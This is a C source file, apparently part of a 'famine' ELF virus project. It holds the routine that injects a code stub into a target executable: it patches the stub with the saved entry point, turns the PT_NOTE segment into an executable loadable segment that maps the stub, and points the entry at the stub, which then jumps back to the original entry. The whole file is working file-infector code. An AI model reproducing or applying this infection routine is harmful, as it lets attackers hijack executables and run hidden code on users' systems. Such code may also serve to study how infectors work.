#include "../include/famine.h"

/*
* @brief Finds an 8-byte sentinel inside the copied stub and overwrites it.
*/
static void patch64(t_famine *f, uint64_t placeholder, uint64_t value)
{
	void *site;

	site = memmem(f->out + f->stub_offset, stub_bin_len, &placeholder, sizeof(placeholder));
	if (site)
		memcpy(site, &value, sizeof(value));
}

/*
* @brief Copy the stub to its page-aligned offset, patch its two runtime values,
* turn the PT_NOTE segment into a loadable exectuable segment that maps it,
* and point the entry at the stub. The stub jumps back to the saved e_entry.
*/
void	inject_stub(t_famine *f)
{
	memcpy(f->out + f->stub_offset, stub_bin, stub_bin_len);

	patch64(f, PLACE_ENTRY, f->ehdr->e_entry);
	patch64(f, PLACE_PHDR, f->phdr_vaddr);

	f->note->p_type = PT_LOAD;
	f->note->p_flags = PF_R | PF_X;
	f->note->p_offset = f->stub_offset;
	f->note->p_vaddr = STUB_VADDR;
	f->note->p_paddr = STUB_VADDR;
	f->note->p_filesz = stub_bin_len;
	f->note->p_memsz = stub_bin_len;
	f->note->p_align = PAGE_SIZE;

	f->ehdr->e_entry = STUB_VADDR;
}

